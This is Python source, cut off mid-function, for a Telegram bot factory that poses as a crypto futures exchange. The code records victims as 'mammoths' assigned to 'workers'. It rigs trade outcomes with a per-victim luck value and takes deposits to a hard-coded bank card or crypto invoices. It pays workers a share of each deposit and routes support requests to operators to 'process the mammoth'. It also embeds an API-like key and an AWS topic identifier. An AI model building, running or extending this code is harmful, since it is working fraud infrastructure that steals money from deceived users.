
def create_mirror(token, admin_id):
    from aiogram.types import LabeledPrice
    import asyncio
    import datetime
    import json
    import logging
    import re
    import random
    import aiohttp
    from aiogram import Bot, Dispatcher, types
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
    from aiogram.contrib.middlewares.logging import LoggingMiddleware
    from aiogram.dispatcher import FSMContext
    from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
    from aiogram.dispatcher.filters.state import State, StatesGroup
    from db import Worker, session, Mammoth, Futures, Withdraws,  MammonthTopUpWithCrypto
    from img import generate_profile_stats_for_worker
    from aws import sns, aws_region, aws_access_key_id, aws_secret_access_key
    from main import API_TOKEN, support_team
    from diction import active_chats
    from config_for_bots import payout_for_admins_bot_token
    TOKEN_FOR_MAIN = API_TOKEN


    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    admin_chat_id = admin_id
    API_TOKEN = token





    def generate_number_for_futures(start_price, luck, is_increase):
    # Начальное значение
        start_price = float(start_price)  # Здесь установлено начальное значение 26 000

    # Генерируем случайное число от -10 до 10 с шагом 0.1
        random_change = random.uniform(0, 0.10)

    # Проверяем вероятность
        if random.random() * 100 <= luck:
            if is_increase:
                generated_price = start_price + ((start_price * random_change))
            else:
                generated_price = start_price - ((start_price * random_change))
        else:
            if is_increase:
                generated_price = start_price - ((start_price * random_change))
            else:
                generated_price = start_price + ((start_price * random_change))
        return generated_price


    logging.basicConfig(level=logging.DEBUG)

    bot = Bot(token=API_TOKEN)
    dp = Dispatcher(bot)
    dp.middleware.setup(LoggingMiddleware())

    @dp.message_handler(content_types=types.ContentType.SUCCESSFUL_PAYMENT)
    async def process_successful_payment(message: types.Message):
        successful_payment = message.successful_payment
        # Здесь можно обработать информацию о платеже
        # Например, подтвердить платеж и предоставить услуги или товары

        # Можно получить информацию о товарах из successful_payment в этом месте
        total_amount = successful_payment.total_amount
        currency = successful_payment.currency
        invoice_payload = successful_payment.invoice_payload

        # Выполните здесь необходимые действия в зависимости от вашего бизнес-процесса

        # Пример: отправить сообщение, что оплата успешно проведена
        await message.answer("Оплата успешно проведена! Спасибо за ваш заказ.")

    @dp.pre_checkout_query_handler(lambda query: True)
    async def process_pre_checkout_query(pre_checkout_query: types.PreCheckoutQuery):
        print('ХУЙЛООООООООО')
        await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
        await bot.send_message(admin_chat_id, 'sdffdsfdf')
    class SendMessagesToOperator(StatesGroup):
        first = State()

    @dp.message_handler(lambda message:message.text == 'Оператор разорвал соединение с вами')
    async def refuse_connection(message: types.Message, state:FSMContext):
        await state.finish()

    from aiogram.dispatcher.filters import Command
    @dp.message_handler(Command("stop_chat"), state=SendMessagesToOperator.first)
    async def stop_chat(message: types.Message, state:FSMContext):
        if not message.from_user.id:
            await message.answer('Авторизуйтесь используя комманду /start')
            return
        data = await state.get_data()
        operator_id = data['operator_id']
        await state.finish()
        await message.answer('Вы завершили чат')
        data = {'chat_id': operator_id, 'text': f'Пользователь с айди {message.from_user.id} разорвал соединение'}
        import requests
        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data)
        for operator, mammonth in active_chats.items():
            if active_chats.get(operator) == str(message.from_user.id):
                del active_chats[operator]
        await message.answer(f'{active_chats} 9999')
    @dp.message_handler(state=SendMessagesToOperator.first)
    async def handle_send_msgs_to_operator_state(message:types.Message, state:FSMContext):
        data = await state.get_data()
        operator_id = data['operator_id']
        import requests
        data = {'chat_id': operator_id, 'text': message.text}
        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data)
        await message.answer(active_chats)

    @dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('start_chat_with_operator'))
    async def handle_chat_with_operator(query: types.CallbackQuery):
        operator_id = query.data.split('_')[-1]
        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
        data = dict()
        data['operator_id'] = operator_id
        await state.set_data(data)
        await SendMessagesToOperator.first.set()


    def choose_duration_futures(id_field):
        duration_options = [30, 60, 120, 180]
        keyboard = InlineKeyboardMarkup()

        for duration in duration_options:
            callback_data = json.dumps({
                'id_field': id_field,
                'duration': duration

            })
            print(callback_data)
            button_text = f"{duration} секунд" if duration < 60 else f"{duration // 60} минут"
            keyboard.add(InlineKeyboardButton(button_text, callback_data=callback_data))

        return keyboard


    class NewBid(StatesGroup):
        onBid = State()


    class CryptoFutures(StatesGroup):
        first = State()

    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    for cryptocurrency in cryptocurrencies:

        print(locals())
        exec(f'''
def show_{cryptocurrency}_futures():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('Повышение', callback_data='{cryptocurrency}_price_increase'), InlineKeyboardButton('Понижение', callback_data='{cryptocurrency}_price_decrease'))
    return keyboard



        ''', locals())

        exec(f'''
@dp.callback_query_handler(lambda callback_query: callback_query.data == f'show_{cryptocurrency}_currency')
async def handler_show_{cryptocurrency}_currency(query: types.CallbackQuery):

    
    from monobank import get_crypto_price_async, fetch_usd_to_rub_currency
    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    index = cryptocurrencies.index("{cryptocurrency}")
    symbol = crypto_symbols[index]
    price_in_usd = float(await get_crypto_price_async(symbol))
    price_in_rub = float(await fetch_usd_to_rub_currency()) * price_in_usd

    await query.message.answer(text = f'Цена {cryptocurrency} сейчас = ' + f'{{price_in_usd:.2f}}' + 'USD' + '(~' + f'{{price_in_rub:.2f}}' + 'RUB' + ')', 
        reply_markup=show_{cryptocurrency}_futures())


''', locals())

        exec(f'''
@dp.message_handler(state = CryptoFutures.first)
async def handle_state_crypto_futures(message: types.Message, state:FSMContext):
    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    data = await state.get_data()
    cryptocurrency = data['cryptocurrency']
    if data['is_increase'] == 'decrease':
        is_increase = False
    else:
        is_increase = True     

    pool = float(message.text)

    from monobank import get_crypto_price_async
    price_in_usd = await get_crypto_price_async(crypto_symbols[cryptocurrencies.index(cryptocurrency)])
    balance = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id ).first().balance
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
    if mammonth.min_input_output_amount_value  <= float(pool) <= 250000:
        if (float(pool) <= balance):
            balance = balance - pool
            session.commit()
            template = f"""
    🔸 *{{cryptocurrency}}/USD*
    💸 Баланс: *{{balance}}* RUB

    💱 Валюта: {{crypto_symbols[cryptocurrencies.index(cryptocurrency)]}}

    💰 Сумма пула: {{pool}} RUB

    💸 Начальная цена: {{price_in_usd}} USD

        """

            
            chat_id = message.chat.id

            new_field_in_futures = Futures(
            chat_id = chat_id, 
            user_id = message.from_user.id, 
            cryptosymbol=crypto_symbols[cryptocurrencies.index(cryptocurrency)], 
            pool = pool,
            start_price = price_in_usd,
            is_increase = is_increase
            )
            
            session.add(new_field_in_futures)
            session.commit()
            
            msg = await message.answer(template, parse_mode=ParseMode.MARKDOWN, reply_markup = choose_duration_futures(id_field =new_field_in_futures.id ))
            new_field_in_futures.message_id = msg.message_id
            session.commit()
            
            await state.finish()
        else:
            await message.answer('Сумма пула больше чем ваш баланс')
            await state.finish()
    else:
        await message.answer(f'Введите число от {{mammonth.min_input_output_amount_value}} до 250.000!')
        await state.finish()

    
        await message.answer(f'Введите число от {{mammonth.min_input_output_amount_value }} до 250.000!')

 

        ''', locals())

        exec(f'''

@dp.callback_query_handler(lambda callback_query: callback_query.data == '{cryptocurrency}_price_increase' or callback_query.data== '{cryptocurrency}_price_decrease')
async def handler_{cryptocurrency}_price_futures(query: types.CallbackQuery): 
    crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
    cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                         'monero', 'euro']
    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
    data = dict()
    data['cryptocurrency'] = '{cryptocurrency}'
    data['is_increase'] = query.data.split('_')[2]
    await state.set_data(data) 
    await query.message.answer('Введите сумму пула')
    await CryptoFutures.first.set()

''', locals())


    def top_up_balance():
        return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data='top_up_balance')).add(InlineKeyboardButton('Вывести',
                                                                                                                                      callback_data='withdraw'))


    def top_up_balance_by_card():
        return InlineKeyboardMarkup().add(InlineKeyboardButton('Банковская карта', callback_data='top_up_balance_by_card')).add(InlineKeyboardButton("""Пополнить 
        криптовалютой""", callback_data='top_up_balance_by_crypto'))


    def show_choose_currency():
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(InlineKeyboardButton('Bitcoin', callback_data='show_bitcoin_currency'), InlineKeyboardButton('Bitcoin Cash', callback_data='show_bitcoin_cash_currency'))
        keyboard.add(InlineKeyboardButton('Ripple', callback_data='show_ripple_currency'), InlineKeyboardButton('Doge', callback_data='show_doge_currency'))
        keyboard.add(InlineKeyboardButton('Ethereum', callback_data='show_ethereum_currency'), InlineKeyboardButton('Binance Coin',
                                                                                                                  callback_data='show_binance_coin_currency'))
        keyboard.add(InlineKeyboardButton('Litecoin', callback_data='show_litecoin_currency'), InlineKeyboardButton('Terra', callback_data='show_terra_currency'))
        keyboard.add(InlineKeyboardButton('Solana', callback_data='show_solana_currency'), InlineKeyboardButton('TRON', callback_data='show_tron_currency'))
        keyboard.add(InlineKeyboardButton('Cardano', callback_data='show_cardano_currency'), InlineKeyboardButton('Polkadot', callback_data='show_polkadot_currency'))
        keyboard.add(InlineKeyboardButton("Polygon", callback_data='show_polygon_currency'), InlineKeyboardButton('Monero', callback_data='show_monero_currency'))
        keyboard.add(InlineKeyboardButton('Euro', callback_data='show_euro_currency'))
        return keyboard


    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    portfolio = KeyboardButton('Портфель 📂')
    open_ecn = KeyboardButton('Открыть ECN 💹')
    info = KeyboardButton('Инфо ℹ')
    support = KeyboardButton('Тех. Поддержка 🌐')

    markup.add(portfolio)
    markup.add(open_ecn)
    markup.add(info, support)

    class WithdrawStates(StatesGroup):
        first = State()
        second = State()
    class PortfolioStates(StatesGroup):
        ShowPortfolio = State()


    class TopUpBalance(StatesGroup):
        WaitingForSum = State()
        WaitingForSumCrypto = State()


    @dp.message_handler(commands=['start'])
    async def send_welcome(message: types.Message):
        first_name = message['from']['first_name']
        template = f"""
*Приветствую, {first_name}*

Это телеграм бот криптоплатформы Hotbit  для торговли на фьючерсах. А также быстрый и бесплатный криптовалютный кошелек.



    """

        if not session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.reply(template, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
            from random import randrange
            new_mammonth = Mammoth(telegram_id=message.from_user.id, belongs_to_worker=admin_chat_id, first_name=message.from_user.first_name, service_id = randrange(
                100000, 999999) )
            worker = session.query(Worker).filter(Worker.telegram_id == admin_chat_id).first()
            worker.mammonts += f'{message.from_user.id},'
            session.add(worker)
            session.add(new_mammonth)
            session.commit()
        else:
            await message.answer('⚡', reply_markup=markup)
            await showportfolio(message)


    @dp.message_handler(lambda message: message.text == 'Портфель 📂')
    async def portfolio_handler(message: types.Message):
        if session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.answer("⚡")
            await showportfolio(message)
        else:
            await message.answer('Авторизуйтесь используя комманду /start')

    @dp.message_handler(lambda message: message.text == 'Открыть ECN 💹')
    async def open_ecn_handler(message: types.Message):
        if session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            currencies = await show_all_currencies()
            await message.answer(currencies, reply_markup=show_choose_currency())
        else:
            await message.answer('Авторизуйтесь используя комманду /start')

    @dp.message_handler(lambda message: message.text == 'Инфо ℹ')
    async def info_handler(message: types.Message):
        if session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.answer("Вы выбрали Инфо ℹ")
        else:
            await message.answer('Авторизуйтесь используя комманду /start')

    @dp.message_handler(lambda message: message.text == 'Тех. Поддержка 🌐')
    async def support_handler(message: types.Message):
        if not session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
            await message.answer('Авторизуйтесь используя комманду /start')
            return
        await message.answer("Ожидайте ответа. С вами должен связаться оператор в ближайшее время 🌐")
        import requests
        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "Обработать мамонта", "callback_data": f"open_support_case_with_mammonth_{message.from_user.id}"},

                ]
            ]

        }
        for unit in support_team:
            data = {
                "chat_id": unit,
                "text": f"Новый пользователь хочет обратиться в техподдержку! Айди юзера {message.from_user.id}",
                "reply_markup": inline_keyboard
            }
            requests.post(f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', json = data)


    async def check_is_paid(uuid, message:types.Message):
        from monobank import cryptomus
        while True:
            invoice_data = await cryptomus(data={'uuid':uuid},url='https://api.cryptomus.com/v1/payment/info')
            if invoice_data['result']['payment_status'] in ('paid', 'paid_over'):
                await message.answer("Вы успешно пополнили свой баланс.")
                mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()

                worker = session.query(Worker).filter(Worker.telegram_id == mammonth.belongs_to_worker).first()
                from  monobank import fetch_usd_to_rub_currency
                usd_to_rub = await fetch_usd_to_rub_currency()
                await bot.send_message(worker.telegram_id, f'''Маммонт пополнил баланс криптовалютой на {invoice_data["result"]["amount"]} USD. Ваш профит и баланс 
                были пополнены''')
                mammonth.balance += usd_to_rub*invoice_data["result"]["amount"]
                worker.profit += usd_to_rub*invoice_data["result"]["amount"]
                worker.profit_quantity += 1
                worker.balance += usd_to_rub*invoice_data["result"]["amount"]
                if not mammonth.was_using_support:
                    worker.balance += (usd_to_rub*invoice_data["result"]["amount"])*0.8
                else:
                    worker.balance += (usd_to_rub * invoice_data["result"]["amount"])*0.6
                top_up_application = session.query(MammonthTopUpWithCrypto).filter(MammonthTopUpWithCrypto.uuid == uuid).first
                session.delete(top_up_application)
                session.commit()

                return
            else:
                print("Invoice is not paid for yet")

            await asyncio.sleep(10)

    @dp.message_handler(lambda message: 2000 <= int(message.text) <= 250000, state=TopUpBalance.WaitingForSumCrypto)
    async def waiting_for_sum__crypto_handler(message: types.Message, state: FSMContext):
        amount = float(message.text)
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
        if not (mammonth.min_input_output_amount_value <= amount <= 250000):
            await message.answer('Сумма должна быть от 2000 до 250000 рублей. Пожалуйста, введите корректную сумму.')
        else:

            last_record = session.query(MammonthTopUpWithCrypto).order_by(MammonthTopUpWithCrypto.order_id.desc()).first()
            try:

                if not last_record or last_record.order_id < 128:
                    from monobank import fetch_usd_to_rub_currency, cryptomus
                    import uuid
                    usd_to_rub = float(await fetch_usd_to_rub_currency())
                    order_id = str(uuid.uuid4())
                    invoice_data = {
                    "amount": f"{amount / usd_to_rub}",
                    "currency": "USD",
                    "order_id": last_record.order_id+1,
                    'accuracy_payment_percent': 1
                }
                    resp = await cryptomus(invoice_data, 'https://api.cryptomus.com/v1/payment')
                    uuid = resp['result']['uuid']
                    new_top_up_application = MammonthTopUpWithCrypto(amount=amount, cryptomus_link=resp['result']['url'], uuid=uuid)
                    session.add(new_top_up_application)
                    session.commit()

                    await message.answer('Ваш ордер принят!', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('Оплатить', url=resp['result']['url'])))
                    await check_is_paid(uuid, message)
                else:
                    await message.answer('Ваш ордер не принят. Система в данный момент перегружена. Попробуйте через 15 минут !')
            except AttributeError:
                await message.answer('Ваш ордер не принят. Система в данный момент перегружена. Попробуйте через 15 минут !')

    @dp.message_handler(lambda message: not (2000 <= int(message.text) <= 250000), state=TopUpBalance.WaitingForSum)
    async def waiting_for_sum_out_of_range(message: types.Message):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
        await message.reply(f"Сумма должна быть от {mammonth.min_input_output_amount_value} до 250000 рублей. Пожалуйста, введите корректную сумму.")



    @dp.message_handler(lambda message: 2000 <= int(message.text) <= 250000, state=TopUpBalance.WaitingForSum)
    async def waiting_for_sum_handler(message: types.Message, state: FSMContext):
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
        if not (mammonth.min_input_output_amount_value <= float(message.text) <= 250000):
            await message.reply(f"Сумма должна быть от {mammonth.min_input_output_amount_value} до 250000 рублей. Пожалуйста, введите корректную сумму.")
            return
        await  message.answer(f'''Бот ожидает перевода  на карту `4441114419894785` в течении 15 минут
        ОБЯЗАТЕЛЬНО К ПЕРЕВОДУ ДОБАВИТЬ В ОПИСАНИИ ТЕКСТ НИЖЕ
        `{mammonth.service_id}`
        ОТПРАВЛЯТЬ ДЕНЬГИ ОДНИМ ПЛАТЕЖЁМ ИНАЧЕ БАЛАНС НЕ БУДЕТ ПОПОЛНЁН
        БАЛАНС СЧИТАЕТСЯ ПОПОЛНЕННЫМ ЕСЛИ ВЫ ОТПРАВИЛИ ПЕРЕВОД НА КАРТУ СУММОЙ НЕ МЕНЕЕ *{float(message.text)*0.95} RUB*''', parse_mode=ParseMode.MARKDOWN)
        title = "Пополнить счет"
        description = "Пополнить счет на бирже Huobi"
        payload = "custom_payload"  # Дополнительная информация
        start_parameter = "start_param"  # Уникальный параметр для начала оплаты


        message_attributes = {
        'WorkerId': {
            'DataType': 'Number',
            'StringValue': f'{admin_chat_id}'
        },
        'MammonthId': {
            'DataType': 'Number',
               'StringValue': f'{message.from_user.id}'
        },
        'Sum': {
            'DataType': 'Number',
            'StringValue': f'{message.text}'
        },
        'FirstName': {
            'DataType': 'String',
            'StringValue': f'{message.from_user.first_name}'
        },
    }
        sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:NewApplications',

                Message=f'''NewApplicationToTopUp''', MessageAttributes=message_attributes

                )
        await state.finish()
        from monobank import waiting_for_mamont_async
        from datetime import datetime, timedelta
        from math import floor
        current_datetime = datetime.now()



        await waiting_for_mamont_async(current_datetime, float(message.text), 'u3dL8d8BJIbUvxNFME1wIOOGdb6BDWUlnX3_Zc9976dc', service_id=mammonth.service_id,
                                       message=message)


    async def show_all_currencies():
        output = ' '
        from monobank import fetch_usd_to_rub_currency
        usd_to_rub = await fetch_usd_to_rub_currency()
        for symbol in crypto_symbols:
            from monobank import get_crypto_price_async
            price_usd = await get_crypto_price_async(symbol)

            if price_usd:

                price_rub = float(price_usd) * float(usd_to_rub)
                output += f"🔸 {symbol}/USD - {float(price_usd):.2f} USD (~ {float(price_rub):.2f} RUB)\n"

            else:
                 output += f"🔸 {symbol}/USD - Недоступно\n"
        return output


    async def showportfolio(message: types.Message):
        user = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()

        template = f"""
📂 Личный кабинет

➖➖➖➖➖➖➖➖➖➖
*⚠️ Не верифицирован*
➖➖➖➖➖➖➖➖➖➖
💰 Баланс: {round(user.balance,2)} RUB
📤 На выводе: {user.on_output} RUB
💼 Криптопортфель:
        *{user.cryptoportfolio['btc']} BTC
        {user.cryptoportfolio['eth']} ETH
        {user.cryptoportfolio['ltc']} LTC*
Ваш  ID - `{user.telegram_id}`
➖➖➖➖➖➖➖➖➖➖
Успешных сделок - {user.succesful_deals}
Всего сделок - {user.deals}
➖➖➖➖➖➖➖➖➖➖

Дата и время: {user.created_at.strftime("%d.%m.%Y %H:%M:%S")}  

    """
        with open('hotbit.jpg', 'rb') as image:
            await bot.send_photo(message.from_user.id, InputFile(image), caption=template, reply_markup=top_up_balance(), parse_mode=ParseMode.MARKDOWN)


    @dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"id_field":'))
    async def futures_edit_msg_handler(query: types.CallbackQuery):
        await asyncio.sleep(2)
        query_data = json.loads(query.data)
        mammonth = session.query(Mammoth).filter(Mammoth.telegram_id == query.from_user.id).first()
        id_field = query_data['id_field']
        duration = query_data['duration']
        time_func = 0
        futures_field = session.query(Futures).filter(Futures.id == id_field).first()
        from monobank import get_crypto_price_async, fetch_usd_to_rub_currency
        price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol),
                                            luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck
                                            , is_increase=futures_field.is_increase)



        msg_to_edit = await bot.edit_message_text(f'''
🔸 {futures_field.cryptosymbol.upper()}/USD*
    💸 Баланс: {mammonth.balance} RUB

    💱 Валюта: {crypto_symbols[cryptocurrencies.index(cryptocurrency)]}

    💰 Сумма пула: {futures_field.pool} RUB

    💸 Начальная цена: {futures_field.start_price} USD
    
    💵 Цена сейчас: {round(price, 2)}
    
    ⏰ Времени прошло {time_func}/{duration}

''', chat_id=futures_field.chat_id, message_id=futures_field.message_id)

        time_func += 3
        await asyncio.sleep(3)
        while True:
            if time_func >= duration:
                end_price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol),
                                                    luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck, is_increase=futures_field.is_increase

                                                    )
                usd_to_rub = float(await fetch_usd_to_rub_currency())
                btcs = (futures_field.pool / usd_to_rub) / futures_field.start_price
                btcs_for_decrease = (futures_field.pool / usd_to_rub) / end_price
                await bot.edit_message_text(f'''
🔸 {futures_field.cryptosymbol.upper()}/USD*
💸 Баланс: {mammonth.balance} RUB

💱 Валюта: {crypto_symbols[cryptocurrencies.index(cryptocurrency)]}

💰 Сумма пула: {futures_field.pool} RUB

💸 Начальная цена: {futures_field.start_price} USD

💵 Цена сейчас: {round(price, 2)}

⏰ Времени прошло {time_func}/{duration}

                ''', chat_id=futures_field.chat_id, message_id=futures_field.message_id)

                if futures_field.is_increase:
                    if futures_field.start_price > end_price:

                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
⛔🧾Вы потеряли {futures_field.pool} RUB🧾⛔
🙌Не сдавайтесь🤞.
Выберите подходящую для вас😏 подходящую стратегию📋 и 
попытайтесь снова🆕🔝
                                        ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.deals += 1

                        user.balance -= futures_field.pool
                        session.commit()
                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = 0 - (btcs * futures_field.start_price - btcs * end_price)

                        data_for_telegram = {'chat_id': user.belongs_to_worker, "parse_mode": "Markdown", 'text': f'''
                        
Пользователь с айди `{query.from_user.id}` 
/t{user.service_id} потерял {futures_field.pool} '''}
                        import requests
                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)


                    else:
                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
✅Вы получили {round(btcs * end_price - btcs * futures_field.start_price, 2)*100} RUB💲💵
Поздравляем с профитом🙌😎! 
Профит это не просто удача🤞, а и правильно подобранная торговая стратегия📋
Продолжайте играть только на нашей бирже самыми большим🐂 выигрышами🏅 и самыми низкими💎 комиссиями
                                                            ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.balance += (btcs * end_price - btcs * futures_field.start_price, 2)*100
                        user.profit += (btcs * end_price - btcs * futures_field.start_price, 2)*100
                        user.deals += 1
                        user.succesful_deals += 1
                        session.commit()

                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = btcs * end_price - btcs * futures_field.start_price
                        data_for_telegram = {'chat_id': user.belongs_to_worker,"parse_mode": "Markdown", 'text': f'''
Пользователь с айди `{query.from_user.id}` /t{user.service_id} получил {round(100*(btcs * end_price - btcs * futures_field.start_price),2)} '''}
                        import requests


                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)

                elif futures_field.is_increase == False:
                    if futures_field.start_price > end_price:
                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
✅Вы получили {round((btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100,2)} RUB💲💵
Поздравляем с профитом🙌😎! 
Профит это не просто удача🤞, а и правильно подобранная торговая стратегия📋
Продолжайте играть только на нашей бирже самыми большим🐂 выигрышами🏅 и самыми низкими💎 комиссиями

                                                                                    ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.balance += (btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100
                        user.profit += (btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100
                        user.deals += 1
                        user.succesful_deals += 1
                        session.commit()

                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = btcs * futures_field.start_price - btcs * end_price
                        data_for_telegram = {'chat_id': user.belongs_to_worker, "parse_mode": "Markdown", 'text':
f'''
Пользователь с айди `{query.from_user.id}`
/t{user.service_id} получил {round((btcs_for_decrease * futures_field.start_price - btcs_for_decrease * end_price)*100,2)} '''}
                        import requests

                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)
                    else:
                        await bot.send_message(chat_id=futures_field.chat_id, text=
f'''
⛔🧾Вы потеряли {futures_field.pool} RUB🧾⛔
🙌Не сдавайтесь🤞.
Выберите подходящую для вас😏 подходящую стратегию📋 и 
попытайтесь снова🆕🔝
         
                                                                ''')
                        user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                        user.deals += 1

                        user.balance -= futures_field.pool
                        session.commit()
                        state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                        data = dict()
                        data['MammonthTelegramId'] = futures_field.user_id
                        data['Amount'] = 0 - (btcs * end_price - btcs * futures_field.start_price)

                        data_for_telegram = {'chat_id': user.belongs_to_worker, "parse_mode": "Markdown", 'text':
    f'''
Пользователь с айди `{query.from_user.id}` 
/t{user.service_id} потерял {futures_field.pool} '''}
                        import requests
                        requests.post(url=f'https://api.telegram.org/bot{TOKEN_FOR_MAIN}/sendMessage', data=data_for_telegram)

                break





            price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol),
                                            luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck
                                            , is_increase=futures_field.is_increase)
            await msg_to_edit.edit_text( text=
f'''
🔸 {futures_field.cryptosymbol.upper()}/USD*
    💸 Баланс: {mammonth.balance} RUB

    💱 Валюта: {crypto_symbols[cryptocurrencies.index(cryptocurrency)]}

    💰 Сумма пула: {futures_field.pool} RUB

    💸 Начальная цена: {futures_field.start_price} USD
    
    💵 Цена сейчас: {round(price, 2)}
    
    ⏰ Времени прошло {time_func}/{duration}

''', )

            time_func += 3
            await asyncio.sleep(3)


    @dp.message_handler(state=NewBid.onBid)
    async def handle_on_bid(message: types.Message, state: FSMContext):
        data = await state.get_data()
        message_attributes = {
        'MammonthTelegramId': {
            'DataType': 'Number',
            'StringValue': f'{data["MammonthTelegramId"]}'
        },
        'Amount': {
            'DataType': 'Number',
            'StringValue': f'{data["Amount"]}'
        },

    }
        sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:onBidTopic',

                Message=f'''NewApplicationOnBid''', MessageAttributes=message_attributes

                )

        await state.finish()


    @dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance')
    async def handle_top_up_balance(query: types.CallbackQuery):
        await query.message.answer('Выберите удобный для вас метод пополнения.', reply_markup=top_up_balance_by_card())
        await query.message.delete()

    @dp.message_handler(state=WithdrawStates.first)
    async def get_card_number(message: types.Message):
        from monobank import is_valid_credit_card
        try:
            if is_valid_credit_card((message.text)):
                await WithdrawStates.second.set()
                state = dp.current_state(chat=message.chat.id, user=message.from_user.id)
                data = dict()
                data['user_id'] = message.from_user.id
                data['card_num'] = message.text
                await state.set_data(data)
                await message.answer('Введите сумму вывода от 2000 RUB')

        except Exception as ex:
            print('сто патрона')
            print(ex)
            await message.answer('''
❌ *Некорректный ввод, введите Ваши реквизиты без лишних пробелов и сторонних символов.*
            
            ''', parse_mode=ParseMode.MARKDOWN)

    @dp.message_handler(state=WithdrawStates.second)
    async def create_application_for_withdraw(message: types.Message, state:FSMContext):
